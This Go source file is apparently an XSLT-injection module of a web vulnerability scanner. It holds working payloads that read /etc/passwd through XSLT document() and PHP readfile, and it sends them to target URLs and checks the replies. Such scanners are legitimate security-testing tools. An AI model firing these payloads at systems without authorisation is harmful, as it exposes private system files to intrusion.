package xslt

import (
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/yupiyy/bhyakugan/internal/core"
)

type XSLTPayload struct {
	Name    string
	Payload string
	Check   string
}

var XSLTPayloads = []XSLTPayload{
	// --- Identification ---
	{"XSLT Vendor Discovery", `<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="system-property('xsl:vendor')"/></xsl:template></xsl:stylesheet>`, ""}, // Check logic handled below
	
	// --- File Read / SSRF ---
	{"XSLT File Read (/etc/passwd)", `<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:copy-of select="document('/etc/passwd')"/></xsl:template></xsl:stylesheet>`, "root:x:"},
	
	// --- PHP RCE (Specific) ---
	{"XSLT PHP readfile", `<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"><body><xsl:value-of select="php:function('readfile','/etc/passwd')" /></body></html>`, "root:x:"},
}

var XSLTVendors = []string{"libxml", "libxslt", "saxon", "xalan", "xerces", "microsoft xml", "msxml"}

// Scan tests for XSLT Injection
func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if baseURL[len(baseURL)-1] != '/' {
		baseURL += "/"
	}

	// Target parameters likely to process XML/XSLT
	params := []string{"xml", "xslt", "xsl", "style", "template"}

	for _, param := range params {
		for _, p := range XSLTPayloads {
			target := fmt.Sprintf("%s?%s=%s", baseURL, param, p.Payload)
			
			resp, err := client.Get(target)
			if err != nil {
				continue
			}
			defer resp.Body.Close()

			bodyBytes, _ := io.ReadAll(resp.Body)
			bodyStr := string(bodyBytes)
			bodyLower := strings.ToLower(bodyStr)

			isVulnerable := false
			detail := ""

			// 1. Check for specific content match (e.g. root:x:)
			if p.Check != "" && strings.Contains(bodyStr, p.Check) {
				isVulnerable = true
				detail = fmt.Sprintf("XSLT matched: %s", p.Check)
			}

			// 2. Identification logic (Vendor Discovery)
			// STRICTER: Only flag if vendor string appears AND (XML headers exist OR XSLT keywords exist)
			if !isVulnerable && p.Name == "XSLT Vendor Discovery" {
				// Check for XSLT Context
				isXSLTContext := strings.Contains(bodyLower, "xmlns:xsl") || 
								 strings.Contains(bodyLower, "<?xml") || 
								 strings.Contains(bodyLower, "transform") ||
								 strings.Contains(bodyLower, "stylesheet") ||
								 strings.Contains(bodyLower, "error") // XSLT Errors often contain vendor name

				if isXSLTContext {
					for _, vendor := range XSLTVendors {
						if strings.Contains(bodyLower, vendor) {
							// Special case for common web servers (Apache/IIS) causing FPs
							if vendor == "apache" || vendor == "microsoft" {
								// Skip unless explicitly "apache xml" or similar (handled by list update above)
								continue
							}
							
							isVulnerable = true
							detail = fmt.Sprintf("XSLT Vendor leaked: %s (Context Confirmed)", vendor)
							break
						}
					}
				}
			}

			if isVulnerable {
				fmt.Printf("[!] POSITIVE MATCH: %s via %s at %s\n", p.Name, param, target)
				onFound(core.Finding{
					Type:     "XSLT Injection",
					Target:   target,
					Detail:   detail,
					Severity: "Critical",
				})
			}
		}
	}
}
